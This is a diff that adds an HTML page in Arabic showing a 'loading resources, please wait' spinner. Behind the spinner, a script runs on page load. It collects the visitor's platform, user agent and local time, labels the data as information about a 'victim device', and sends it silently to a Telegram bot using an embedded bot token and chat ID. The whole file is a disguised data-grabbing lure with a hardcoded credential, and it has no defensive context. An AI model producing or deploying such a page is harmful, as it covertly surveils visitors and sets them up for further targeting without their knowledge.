@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<script>
+window.onload = function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('chatId') || "5905562720";
+    const token = "8521496596:AAGb7ODWoScawEb5Fm78sPLL8pfBeXZQzlg";
+    const info = `📟 **معلومات جهاز ضحية**\n\n📱 النظام: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent}\n⏰ الوقت: ${new Date().toLocaleString()}`;
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
+};
+</script>
+<body style="background:white; text-align:center; padding-top:100px;">
+    <h3>جاري تحميل الموارد... يرجى الانتظار</h3>
+    <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin:auto;"></div>
+    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+</body>
+</html>
